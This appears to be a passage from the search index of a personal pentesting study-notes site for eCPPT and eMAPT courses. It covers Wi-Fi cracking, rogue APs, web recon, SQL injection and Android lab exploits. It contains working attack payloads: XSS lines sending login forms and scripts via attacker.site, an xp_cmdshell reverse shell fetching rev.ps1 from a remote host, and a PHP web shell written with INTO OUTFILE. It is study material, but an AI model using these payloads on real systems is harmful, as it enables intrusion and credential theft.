aireplay-ng -3 -b &lt;bssid&gt; &lt;intf&gt;\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-","title":"---","text":"<p>WEP Cracking with <code>aircrack-ng</code> <pre><code>$ aircrack-ng -n &lt;key_lenght&gt; &lt;.cap file(s)&gt;\n$ aircrack-ng -e &lt;ssid&gt; &lt;.cap file(s)&gt;\n</code></pre></p> <p>Clientless WEP cracking <pre><code>1. Capture data\n$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt; \n\n\n2. Authenticating to the AP - Fake Authentication\n$ aireplay-ng -1 6000 -q 10 -a &lt;bssid&gt; &lt;interface&gt;\n\n\n3. Aireplay-ng Fragmentation Attack\n$ aireplay-ng -5 -b &lt;bssid&gt; -c &lt;source_mac&gt; &lt;interface&gt; \n    -5 = indicates the fragmentation attack\n    -c = attacker wireless adapter MAC\n\n\n4. Build ARP request packet with captured PRGA\n$ packetforge-ng -0 -a &lt;bssid&gt; -h &lt;attacker_mac&gt; -k &lt;ip1&gt; -l &lt;ip2&gt; -y &lt;prga.xor&gt; -w outfile\n$ packetforge-ng -0 -a &lt;bssid&gt; -h &lt;attacker_mac&gt; -k 255.255.255.255 -l 255.255.255.255 -y &lt;prga.xor&gt; -w packet_file\n\n\n5. Inject the forged ARP requests\n$ aireplay-ng -2 -r &lt;packet_file&gt; &lt;interface&gt;\n\n\n\n6. If everything works fine airodump-ng will generate new traffic and gather IV. Then use aircrack-ng as previously seen.\n</code></pre></p> <p>Bypassing Shared key Authetication <pre><code>1. Capture data\n$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt; \n\n\n2. Send Deauth frames\n$ aireplay-ng -0 &lt;num&gt; -c &lt;client_mac&gt; -a &lt;BSSID&gt; &lt;mon_interface&gt;\n\n3. On airodump-ng windows, \"keystream\" message should be visible, which is saved to .xor file.\n\n4. Fake authentication attack\n$ aireplay-ng -1 6000 -q 10 -e &lt;ssid&gt; -y &lt;file.xor&gt; &lt;interface&gt;\n\n5. ARP replay attack\n$ aireplay-ng -3 -b &lt;bssid&gt; &lt;intf&gt;\n</code></pre></p> <p>Attacking the client - Caffe-Latte attack <pre><code># Assume that Conditions :\n    - Target network AP is switched off or out of range\n    - A Client with a pre-configured WEP Key for the targer network\n    - Another device that use as an attack point\n\n\n1. Capture data\n$ airodump-ng wlan0mon -c &lt;channel&gt; -w &lt;filename&gt; \n\n2. Caffe-Late attack\n$ airbase-ng -c &lt;channel&gt; -W 1 -L -e &lt;SSID&gt; &lt;interface&gt;\n    -L = enable Cafe-Latte attack\n    -e = act as an AP for the specified SSID\n    -c = fixes channel\n    -W = force airbase-ng to net set the WEP Privacy bit in beacon\n\n3. Wait to get sufficient amount of packets, then use aircrack-ng \n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-_1","title":"---","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wpawpa2","title":"WPA/WPA2","text":"<p>Capture the Handshake <pre><code># Capture Packets/Handshake\n$ airodump-ng wlan0mon -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;filename&gt;\n\n\n# Deauthenticate client \n$ aireplay-ng -0 &lt;num&gt; -c &lt;client_mac&gt; -a &lt;BSSID&gt; &lt;mon_interface&gt;\n\n\n# Crack Handshake - Aircrack-ng\n$ aircrack-ng -w &lt;wordlist(s)&gt; &lt;.cap file&gt;            # Dictionary Attack\n$ aircrack-ng -S                                      # Benchmark\n</code></pre></p> <p>Capture PMKID</p> <pre><code># install hcxdumptool\ngit clone https://github.com/ZerBea/hcxdumptool\ncd hcxdumptool/\nmake\nsudo make install\ncd .. # up\n\n# install hcxtools\nsudo apt install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev\ngit clone https://github.com/ZerBea/hcxtools\ncd hcxtools /\nmake\nsudo make install\ncd ..\n\n\n-------------------------------------------------------------------------------\n\n# Capture PMKID\n$ ./hcxdumptool -i &lt;interface&gt; --rds=1 -w &lt;captured.pcapng&gt;\n\n# Convert pcapng to Hashcat format\n$ ./hcxpcapngtool -o hash.22000 &lt;captured.pcapng&gt;\n&gt; https://hashcat.net/cap2hashcat/\n\n# Verify Hash SSIDs\n$ ./hcxhashtool -i &lt;hash.22000&gt; -E stdout\n\n# Crack with hashcat\n$ hashcat -m 22000 hash.2200 &lt;wordlist&gt;\n</code></pre> <p>Crunch <pre><code>$ crunch &lt;min_lenght&gt; &lt;max_lenght&gt; -o my_wordlist.lst\n\n$ crunch 8 8 | aircrack-ng -e &lt;SSID&gt; &lt;.cap file&gt; -w -\n</code></pre></p> <p>Hashcat <pre><code># Convert .cap file to .hccapx\n- https://hashcat.net/cap2hashcat/\n- hcxpcapngtool -o hash.22000 &lt;captured.pcapng&gt;\n\n\n# Crack with Hashcat\n$ hashcat -m 22000 &lt;hash.22000&gt; &lt;wordlist&gt;\n\n\n\nNOTE : oclhashcat is used for AMD/ATI GPUs, cudahashcat is used for NVIDIA GPUs\n</code></pre></p> <p>Hashcat as a service <pre><code>https://www.onlinehashcrack.com/\n</code></pre></p> <p>Pyrit <pre><code>$ pyrit eval                                        # Check database status\n$ pyrit -i &lt;wordlist_file&gt; import_passwords         # Import Passwords\n$ pyrit -e &lt;SSID&gt; create_essid                      # Provied SSID\n$ pyrit eval                                        # Check Database status\n$ pyrit batch                                       # Start Building Database\n$ pyrit -r &lt;.cap file&gt; attack_db                    # Attack/Crack\n\n\n\n\n# Pre Build Databases with 1000 frequently used SSIDs\nhttps://www.renderlab.net/projects/WPA-tables/\n</code></pre></p>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-_2","title":"---","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wps","title":"WPS","text":"<pre><code># List of WPS enabled APs\nwash -i &lt;interface&gt;\n\n\n# Crack WPS - Bully\n$ bully -b &lt;BSSID&gt; -c &lt;channel&gt; &lt;interface&gt;\n$ bully -b &lt;BSSID&gt; -c &lt;channel&gt; -1 &lt;sec&gt; -2 &lt;sec&gt; &lt;interface&gt;\n$ bully -b &lt;BSSID&gt; -c &lt;channel&gt; -1 60 -2 60 &lt;interface&gt;          # Delay\n$ bully &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -S -F -B -v 3        # Hacktricks\n\n\n# Crack WPS - Reaver\n$ reaver -i &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -vv\n$ reaver -i &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -vv -d 60        # Delay\n$ reaver -i &lt;interface&gt; -b &lt;BSSID&gt; -c &lt;channel&gt; -b -f -N [-L -d 2] -vvroot  # Hacktricks\n</code></pre>"},{"location":"eCPPT%20Materials/WIFI%20Security/#-_3","title":"---","text":""},{"location":"eCPPT%20Materials/WIFI%20Security/#wi-fi-as-attack-vectors","title":"Wi-Fi as Attack Vectors","text":"<p>WEP - Rouge AP / Recover Keystream <pre><code># Putting Wireless Adapter into Monitor Mode\n$ airmon-ng start &lt;intf&gt;\n\n\n# Capture packets / Dump the incoming keystreams to a file\n$ airodump-ng  -c &lt;channel&gt; -w &lt;outfile&gt; &lt;mon_interface&gt;\n\n\n# Spoof SSID\n$ airbase-ng -c &lt;channel&gt; -e &lt;SSID&gt; -s -W 1 &lt;intf&gt;\n    -s = force shared key authentication\n    -W = set WEP flag in beacons\n\n\n# When client connects to our Rouge AP, we recieve Keystreams stored in .xor file.\n</code></pre></p> <p>WPA/WPA2 - Rogue AP / Capture Handshake <pre><code># Putting Wireless Adapter into Monitor Mode\n$ airmon-ng start &lt;intf&gt;\n\n\n# Capture Packets/Handshake\n$ airodump-ng  -c &lt;channel&gt; -w &lt;outfile&gt; &lt;mon_interface&gt;\n\n\n# Spoof SSID\n$ airbase-ng -c &lt;channel&gt; -e &lt;SSID&gt; -W 1 -Z 4 &lt;intf&gt;\n    -W = set WEP flag in beacons\n    -Z = Set WPA2 with CCMP encryption\n\n\n\n# When client tricked to connect our Rouge AP, we recieve Handshake stored in .cap file.\n</code></pre></p> <p>Man in the Middle Attack</p> <pre><code># Put Wirekess interface to Monitor mode\n$ airmon-ng start &lt;intf&gt;\n\n\n# Start/Set-up Access Point\n$ airbase-ng -c &lt;channel&gt; -e \"Free Internet\" &lt;intf&gt;\n\n\n# Create a Network Bridge Interface\n$ apt-get install bridge-utils                  # brctl: Command not found\n$ brctl addbr br0\n$ brctl addif br0 eth0\n$ brctl addif br0 at0\n\n&gt; br0  = bridge interface\n&gt; eth0 = attacker wired interface\n&gt; at0  = virtual interface created by airbase-ng\n\n\n# Assign IP Address to bridged interface\n{\n$ ifconfig eth0 0.0.0.0 up\n$ ifconfig at0 0.0.0.0 up\n}\n$ ifconfig br0 &lt;ip_address&gt; up\n\n\n# Enable Port-Forwarding\n$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n\n\n# Capture Packets/Data\n&gt; Wireshark\n&gt; Tcpdump\n  tcpdump -nvi &lt;intf&gt; tcp port 80 -A\n</code></pre> <p>Evil Twins Attack</p> <pre><code># https://github.com/sensepost/mana\n\n$ apt install mana-toolkit                   # Linux Install\n$ /usr/share/mana-toolkit/run-mana/          # Mana Scripts\n$ /etc/mana-toolkit/hostapd-mana.conf        # Configuration File\n$ /usr/share/mana-toolkit/www/portal         # Location of Landing Page\n\n\n-----------------------------------------\n\n# Metasploit - Fake DNS\nmsf &gt; use auxiliary/server/fakedns\nmsf &gt; SET TARGETACTION FAKE\nmsf &gt; SET TARGETDOMAIN *\nmsf &gt; SET 10.0.0.1\nmsf &gt; exploit -j\n\n-----------------------------------------\n\n\n\n\nNOTE : Upon Deauthentication of the client, the client should auto-reconnect to the AP with the stronger signal ( The attacker controlled AP )\n</code></pre> <p>WPA2-Enterprise <pre><code># https://github.com/s0lst1c3/eaphammer\n</code></pre></p> <p>Wardriving <pre><code># https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&amp;hl=en\n\n# https://wigle.net/\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/","title":"Web App Security","text":""},{"location":"eCPPT%20Materials/Web%20App%20Security/#information-gathering","title":"Information Gathering","text":""},{"location":"eCPPT%20Materials/Web%20App%20Security/#gathering-information","title":"Gathering Information","text":"<p>Whois <pre><code>&gt; whois google.com                                # Linux\n&gt; whois.exe google.com                            # Windows\n</code></pre></p> <p>Netcraft <pre><code>https://sitereport.netcraft.com/\n</code></pre></p> <p>IP Resolve <pre><code>dig domain.com\n</code></pre> <pre><code>nslookup domain.com\n</code></pre></p> <p>Nameserver lookup <pre><code>dig domain.com NS\n</code></pre> <pre><code>nslookup -type=NS domain.com\n</code></pre></p> <p>Reverse DNS lookup <pre><code>dig domain.com PTR\n</code></pre> <pre><code>nslookup -type=PTR domain.com\n</code></pre></p> <p>Mail Exchange lookup <pre><code>dig domain.com MX\n</code></pre> <pre><code>nslookup -type=MX domain.com\n</code></pre></p> <p>Zone transfers <pre><code>dig axfr @DNS_IP domain.com\n</code></pre> <pre><code>nslookup\n&gt; server [nameserver for domain.com]\n&gt; 1s -d domain.com\n</code></pre></p> <p>DNS Tools <pre><code>fierce --domain domain.com \n</code></pre> <pre><code>fierce --domain domain.com --dns-servers {IP}\n</code></pre></p> <p><pre><code>dnsenum domain.com\n</code></pre> <pre><code>dnsenum domain.com --dnsserver {DNS IP}\n</code></pre> <pre><code>dnsenum domain.com -f {subdomain file}\n</code></pre></p> <p><pre><code>dnsmap domain.com\n</code></pre> <pre><code>dnsmap domain.com -w {subdomain file}\n</code></pre></p> <p><pre><code>dnsrecon -d domain.com\n</code></pre> <pre><code>dnsrecon -d domain.com -n {NS IP}\n</code></pre> <pre><code>dnsrecon -d domain.com -{scan option}\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#infrastructure","title":"Infrastructure","text":"<p>Fingerprint WebServer <pre><code># Netcraft\nhttps://sitereport.netcraft.com/\n\n\n\n# NetCat\n&gt; nc domain.com 80\n&gt; HEAD / HTTP/1.0\n\n\n# WhatWeb\n&gt; whatweb domain.com\n&gt; whatweb -v domain.com\n&gt; whatweb -a 3 -v domain.com\n\n\n# httprint\n</code></pre></p> <p>Enumerating Subdomains <pre><code># Enumerate Subdomains with netcraft\nhttps://searchdns.netcraft.com/\n\n\n-------------------------------------------------------------------------------\n\n# Enumerate Subdomains with Google\nGoogle &gt; site:.domain.com                            # Search Subdomains\nGoogle &gt; site:.domain.com -inurl:www.                # Search Without www.\n\n\n\n-------------------------------------------------------------------------------\n\n\n# Enumerate Subdomains with Tools\n&gt; dnsrecon -h\n&gt; dnsrencon -d domain.com -g                         # Perform Google Enum\n\n\n&gt; theharvester -d domain.com -b all                  # Subdomain Enum \n\n\n-------------------------------------------------------------------------------\n\n\n# Enumerating Subdomains with Zone Transfers\n&gt; nslookup -type=NS domain.com                     # Find Nameservers\n&gt; nslookup\n&gt; server [NAMESERVER]\n&gt; 1s -d domain.com\n\n\n&gt; dig axfr domain.com @NAMESERVER\n\n\n-------------------------------------------------------------------------------\n</code></pre></p> <p>Finding Virtual Hosts <pre><code>fierce -dns domain.com\n</code></pre></p> <p>Fingerprinting Frameworks and Applications Fingerprinting Third-Party Add-Ons Mapping Attack Surface     Client Side Validation     Database Interaction     File Uploading and Downloading     Display of User Supplied Data     Redirections     Access Controls and Login Protected Pages     Error Messages     Charting</p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#enumerating-resources","title":"Enumerating Resources","text":"<p>Crawling with Burp Suite</p> <p>Finding Hidden Data <pre><code># List of Backup file extensions\n1. bak\n2. bac\n3. old\n4. 000\n5. ~\n6. 01\n7. _bak\n8. 001\n9. inc\n10. Xxx\n\n\n# On ASP.net based framework .inc is used. \n\n\n# Configuration Files Source Code View Examples\n1. configuration.php.bak\n2. configuration.php.old\n3. ...\n\n\n\n# Check Availability of PUT request\n&gt; curl -X OPTIONS domain.com\n\n\n# Guess writable folder to use PUT method include folders where user supplied files are stored.\n</code></pre></p> <p>Google Hacking <pre><code>https://www.exploit-db.com/google-hacking-database\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#cross-site-scripting","title":"Cross Site Scripting","text":"<pre><code># Change Page Content\n&lt;script&gt;document.body.innerHTML=\"&lt;h1&gt;HACKED&lt;/h1&gt;\";&lt;/script&gt;\n\n\n# XSS Phishing on Login Page\n&lt;script&gt;document.form[0].action=\"htpps://attacker.site/steal.php\";&lt;/script&gt;\n\n\n# Create Element with Remote JS File\n&gt; var s = document.createElement('SCRIPT');\n&gt; s.src = '//attacker.site/alert.js';\n&gt; document.body.appendChild(s);\n</code></pre>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#sql-injection","title":"SQL Injection","text":"<p>SQLmap <pre><code># Basic Syntax\n&gt; sqlmap -u &lt;URL&gt; -p &lt;injection parameter&gt; [options]\n\n\n# Basic Post Requiest Injection\n&gt; sqlmap -u &lt;URL&gt; --data=&lt;POST string&gt; -p &lt;parameter&gt; [options]\n\n\n# Specify File\n&gt; sqlmap -r &lt;request file&gt; -p &lt;parameter&gt; [options]\n\n\n# Retrieve Banner\n&gt; sqlmap -u &lt;URL&gt; --banner \n\n\n# List Users of Database\n&gt; sqlmap -u &lt;URL&gt; --users \n\n\n# Check if User is Administrator\n&gt; sqlmap -u &lt;URL&gt; --is-dba \n\n\n# List All of the Databases\n&gt; sqlmap -u &lt;URL&gt; --dbs\n\n\n# List Tables\n&gt; sqlmap -u &lt;URL&gt; -D &lt;database&gt; --tables\n\n\n# List Columns\n&gt; sqlmap -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; --columns\n\n\n# Dump Table\n&gt; sqlmap -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; -C &lt;column&gt; --dump\n\n\n# Specify DBMS\n&gt; sqlmap -u &lt;URL&gt; --dbms=&lt;DBMS&gt;\n\n\n# Append String which is always resented in output\n&gt; sqlmap -u &lt;URL&gt; --string \"johnDoe\"\n\n\n# If injected payload needs to end with '));\n&gt; sqlmap -u &lt;URL&gt; --suffix \"'));\"\n\n\n# Persistent Connections To Dump Bounch of Data\n&gt; sqlmap -u &lt;URL&gt; --keep-alive \n\n\n# Reduce Dumping Phase Time\n&gt; sqlmap -u &lt;URL&gt; --threads &lt;1-10&gt;\n\n\n# Level Attribute\n* Level 2 = The Cookie Header\n* Level 3 = The User Agent and Referrer\n* Level 5 = The Host\n\n\n# Risk Attribute\n* Level 1 - Innocous Inejctions (Default)\n* Level 2 - Enables Heavy Time-Based Injections\n* Level 3 - Enables OR-Based Injections\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#server-takeover","title":"Server Takeover","text":"<p>SQL Server <pre><code># Username + Password + CMD command\ncrackmapexec mssql -d &lt;Domain name&gt; -u &lt;username&gt; -p &lt;password&gt; -x \"whoami\"\n# Username + Hash + PS command\ncrackmapexec mssql -d &lt;Domain name&gt; -u &lt;username&gt; -H &lt;HASH&gt; -X '$PSVersionTable'\n\n# Check if xp_cmdshell is enabled\nSELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';\n\n# This turns on advanced options and is needed to configure xp_cmdshell\nsp_configure 'show advanced options', '1'\nRECONFIGURE\n#This enables xp_cmdshell\nsp_configure 'xp_cmdshell', '1'\nRECONFIGURE\n\n#One liner\nsp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n# Quickly check what the service account is via xp_cmdshell\nEXEC master..xp_cmdshell 'whoami'\n\n# Get Rev shell\nEXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.13:8000/rev.ps1\") | powershell -noprofile'\n\n# Bypass blackisted \"EXEC xp_cmdshell\"\n'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' \u2014\n\n\n-------------------------------------------------------------------------------\n\n# Get Username and Password hash\n&gt; SELECT name, password FROM master..sysxlogins\n&gt; SELECT name, password_hash FROM master..sys.sql_logins\n\n\n# Port Scanning\n&gt; SELECT * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=something,Network=DBMSSOCN;Address=&lt;Target IP&gt;,&lt;Target PORT&gt;;timeout=&lt;connection timeout in secconds&gt;', 'select 1')-- \n\n\n# Read file and Save output of command on a web accessible folder\n&gt; EXEC master..xp_cmdshell 'dir C:\\ &gt; C:\\inetpub\\wwwroot\\site\\dir.txt'--\n\n\n# Read file and puts its content into a table.\n&gt; CREATE TABLE filecontent(line varchar(8000));\n&gt; BULK INSERT filecontent FROM '&lt;target_file&gt;';\n\n\n# Upload file to the victim Server\n1. Insert the file into a table in MS SQL database under our control\n    &gt; CREATE TABLE HelperTable (file text)\n    &gt; BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')\n1. Force the target DB server to retrieve it from our server\n    &gt; EXEC xp_cmdshell 'bcp \"SELECT * FROM HelperTable\" queryout shell.exe -c -Craw -S&lt;out server address&gt; -U&lt;out server username&gt; -P&lt;out server password&gt;'\n</code></pre></p> <p>MySQL <pre><code># Read File\n&gt; select load_file('/etc/passwd');\n\n# Write to a file\n&gt; select 1,2,\"&lt;?php echo shell_exec($_GET['c']);?&gt;\",4 into OUTFILE 'C:/xampp/htdocs/back.php'\n\n\n# Write the result of a query to a file\n&gt; select &lt;field&gt; from &lt;table&gt; into dumpfile '&lt;output file path&gt;';\n\n\n# Execution Shell Commands - User Defined Functions (UDF)\n&gt; sqlmap -u &lt;URL&gt; --os-cmd\n&gt; sqlmap -u &lt;URL&gt; --os-shell\n</code></pre></p>"},{"location":"eCPPT%20Materials/Web%20App%20Security/#common-web-attacks","title":"Common Web Attacks","text":"<p>Session Files <pre><code># PHP Session stored within the folder specified by the php.ini entry - sesion.save_path.\n# PHP session file name example - sess_&lt;session_id&gt;\n\n-------------------------------------------------------------------------------\n\n# Java - Tomcat sessions stored in SESSIONS.ser \n</code></pre></p> <p>Session Fixation <pre><code># Session fixation exist if the server identifier(session) remains the same after successfuly login\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/","title":"Mobile Application Security Testing","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#android-build-process","title":"Android Build Process","text":"<p>In order to inspect the content of APK file, first need to change its extension to .ZIP and then decompress it.</p> <p>Once decompressed, following files and directories revealed  - AndroidManifest.xml - classes.dex - resources.arsc - /assets - /lib - /META-INF - /res - Third-Party libraries, etc...</p> <p>This files holds the keys to most of security topics</p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#signing","title":"Signing","text":"<p>Generate private key using keytool</p> <pre><code>keytool -genkey -v -keystore foo.keystore -keyalg RSA -keysize 2048 -validity 10000 -alias myalias\n</code></pre> <p>Sign APK </p> <pre><code>jarsigner -signalg SHA1withRSA -digestalg SHA1 -keystore foo.keystore test.apk myalias\n</code></pre> <p>Build APK</p> <pre><code>apktool b . #In the folder generated when you decompiled the application\n</code></pre> <p>Inspect the status of signed APK file</p> <pre><code>jarsigner -verify -verbose -certs com.foo.android.activity.apk\n</code></pre> <p>Align APK file due to improve RAM utilization when running the application</p> <pre><code>zipalign -v 4 project_unaligned.apk project.apk\n</code></pre> <p>Convert CERT.RSA to pem ( Human Readable)</p> <pre><code>openssl pkcs7 -inform DER -print_certs -out cert.pem -in CERT.RSA\n</code></pre> <p>See details for the public key in the certificate</p> <pre><code>openssl x509 -in cert.pem -noout -text\n</code></pre> <p>Check file integrity </p> <pre><code>openssl sha1 -binary MANIFEST.MF | openssl base64 \n</code></pre>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#-","title":"---","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#reversing-apks","title":"Reversing APKs","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#apktool","title":"APKTool","text":"<p>Decode .apk file <pre><code>apktool d android.apk\n</code></pre></p> <p>Prevents classes.dex file from being disassembled <pre><code>apktool d android.apk -s\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#dex2jar","title":"Dex2jar","text":"<p>Convert classes.dex file to a .jar file <pre><code>d2j-dex2jar classes.dex -i output_file.jar\n</code></pre></p> <pre><code>d2j-dex2jar android.apk -i output_file.jar\n</code></pre>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#jadx-gui","title":"Jadx-GUI","text":"<p>Decompile APK/JAR/DEX.... <pre><code>jadx-gui &gt; Open File &gt; File\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#assembler-disassembler","title":"Assembler / Disassembler","text":"<p>Dissasemble .dex file <pre><code>d2j-backsmali classes.dex\n</code></pre></p> <p>Assemble source file <pre><code>d2j-smali source_dir/\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#-_1","title":"---","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#network-configuration","title":"Network Configuration","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#burp-proxy-configuration","title":"Burp Proxy Configuration","text":"<p>Set up Proxy <pre><code>adb shell settings put global http_proxy &lt;IP&gt;:&lt;PORT&gt;\n</code></pre></p> <p>Get Proxy List <pre><code>adb shell settings get global http_proxy\n</code></pre></p> <p>Remove Proxy <pre><code>adb shell settings put global http_proxy :0\n</code></pre> <pre><code>adb shell settings delete global http_proxy\n</code></pre></p> <p>OR run emulator the -http-proxy option <pre><code>~/Library/Android/sdk/emulator/emulator -avd &lt;avd_name&gt; -http-proxy &lt;IP&gt;:&lt;PORT&gt;\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#install-proxy-certification","title":"Install Proxy Certification","text":"<p>Export Burp CA </p> <p>Convert .DER to .PEM <pre><code>openssl x509 -inform DER -in &lt;cert.der&gt; -out &lt;cert.pem&gt;\n</code></pre></p> <p>Output the hash with subject_hash_old to rename the .PEM file <pre><code>openssl x509 -inform PEM -subject_hash_old -in &lt;cert.pem&gt; | head -1\n\nmv &lt;cert.pem&gt; &lt;cert&gt;.0\n</code></pre></p> <p>List AVDs <pre><code>~/Library/Android/sdk/emulator/emulator -list-avds\n</code></pre></p> <p>Run AVD with the -writable-system option <pre><code>~/Library/Android/sdk/emulator/emulator -avd &lt;avd_name&gt; -http-proxy &lt;IP&gt;:&lt;PORT&gt;  -writable-system\n</code></pre></p> <p>Remount /system as writable / Copy the certificate to the device <pre><code>adb root\nadb remount\nadb push &lt;cert&gt;.0 /sdcard/\nadb shell mv /sdcard/&lt;cert&gt;.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/&lt;cert&gt;.0\nadb reboot\n</code></pre></p> <p>Browsing to Settings -&gt; Security -&gt; Trusted Credentials should show the new \u201cPortswigger CA\u201d as a system trusted CA</p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#ca-pinning-bypass","title":"CA Pinning Bypass","text":"<p>Automated Tool - apk-mitm <pre><code># Install\n$ sudo apt install nodejs npm\n$ npm install -g apk-mitm\n\n# Example\n$ apk-mitm &lt;path-to-apk&gt;\n</code></pre></p> <p>Reference</p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#-_2","title":"---","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#staticdynamic-code-analysis","title":"Static/Dynamic Code Analysis","text":""},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#drozer","title":"Drozer","text":"<p>Install Drozer <pre><code>pip3 install drozer-3.0.2-py3-none-any.whl\npip install twisted\npip install service_identity\n</code></pre></p> <p>Install Drozen-Agent <pre><code>adb install drozer-agent.apk\n</code></pre></p> <p>Establish the communication between the Drozer Client and Agent <pre><code>adb forward tcp:31415 tcp:31415\n\ndrozer console connect\n</code></pre></p> <p>RoadMap 1) Static Code Analysis 2) SQL Injection 3) Path/Directory Traversal 4) Vulnerable Activities 5) Vulnerable Recievers 6) Vulnerable Services     1) /data/data/{package}/files 7) Shared Preferences     1) /data/data/{package}/shared_prefs 8) Local Databases     1) /data/data/{package}/databases         1) .header on         2) .mode column         3) .timer on         4) SELECT * FROM table;</p> <p>Drozer Commands <pre><code># List all the installed packages\n$ dz&gt; run app.package.list\n\n# Find accessible content URIs\n$ dz&gt; run scanner.provider.finduris -a &lt;package_name&gt;\n\n# Find the package name of a specific app\n$ dz&gt; run app.package.list -f (string to be searched)\n\n# See basic information\n$ dz&gt; run app.package.info -a (package name)\n\n# Identify the exported application components\n$ dz&gt; run app.package.attacksurface (package name)\n\n# Identify the list of exported Activities\n$ dz&gt; run app.activity.info -a (package name)\n\n# Launch the exported Activities\n$ dz&gt; run app.activity.start --component (package name) (component name)\n\n# Identify the list of exported Broadcast receivers\n$ dz&gt; run app.broadcast.info -a (package name)\n\n# Send a message to a Broadcast receiver\n$ dz&gt; run app.broadcast.send --action (broadcast receiver name) --component (package name) (component name)  --extra (number of arguments)\n\n# Detect SQL injections in content providers\n$ dz&gt; run scanner.provider.injection -a (package name)\n\n# Detect Path Traversal in content providers\n$ dz&gt; run scanner.provider.traversal -a (package name)\n</code></pre></p> <p>ADB Commands <pre><code>adb shell pm list packages              # List installed packages\nadb shell pm path &lt;package&gt;             # Returns path of package\nadb shell am start                      # Starts activity\nadb shell am startservice               # Starts service\nadb shell am broadcast                  # Send a broadcast\n\nadb shell pull &lt;device_path&gt; &lt;local_path&gt;     \nadb shell push &lt;local_path&gt; &lt;device_path&gt;\n\nadb install &lt;package&gt;                   # Install pacakge\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#qark","title":"QARK","text":"<p>Install QARK <pre><code>pip2 install qark\nqark --help\n\nOR\n\ngit clone https://github.com/linkedin/qark\npython2 setup.py install\n</code></pre></p>"},{"location":"eMAPT/Mobile%20Application%20Security%20Testing/#exploits","title":"Exploits","text":"<p>FourGates Broadcast receivers <pre><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver\u00a0 --extra string phoneNumber 5554 --extra string message \"hacked\"\n</code></pre></p> <p>InjectMe SQL Injection <pre><code>dz&gt; run scanner.provider.injection -a com.elearnsecurity.injectme\ndz&gt; run scanner.provider.finduris -a com.elearnsecurity.injectme\ndz &gt; run app.provider.query content://com.elearnsecurity.injectme.provider.CredentialProvider/credentials/\n\n\nadb shell content query --uri content://com.elearnsecurity.injectme.provider.CredentialProvider/credentials/\n</code></pre></p> <p>FileBrowser Path Traversal  <pre><code>dz&gt; run scanner.provider.traversal -a com.els.filebrowser\ndz&gt; run app.provider.read content://com.els.filebrowser/../../../proc/cpuinfo\n</code></pre></p> <p>LeakResult Bypass <pre><code>$ adb shell logcat\n\ndz&gt; run app.activity.start --component com.elearnsecurity.insecureactivities com.elearnsecurity.insecureactivities.LeakyActivity\n\n\nadb shell am start -n com.elearnsecurity.insecureactivities/.LeakyActivity\n</code></pre></p> <p>SillyService Command Injection <pre><code>adb shell am startservice \u2013n com.elearnsecurity.sillyservice/.SillyService \u2013e \"COMMAND\" \"find; ls\"\n</code></pre></p> <p>VulnerableReceiver BroadcastReceiver <pre><code>dz &gt; run app.broadcast.send --action com.elearnsecurity.vulnerablereceiver.CHANGEPW --component com.elearnsecurity.vulnerablereceiver com.elearnsecurity.vulnerablereceiver.VulnerableReceiver --extra string PASSWORD \"hacked\"\n\n\n\nam broadcast -a com.elearnsecurity.vulnerablereceiver.CHANGEPW -e PASSWORD \"hacked\"\n</code></pre></p> <p>WeakWallet Sql Injection 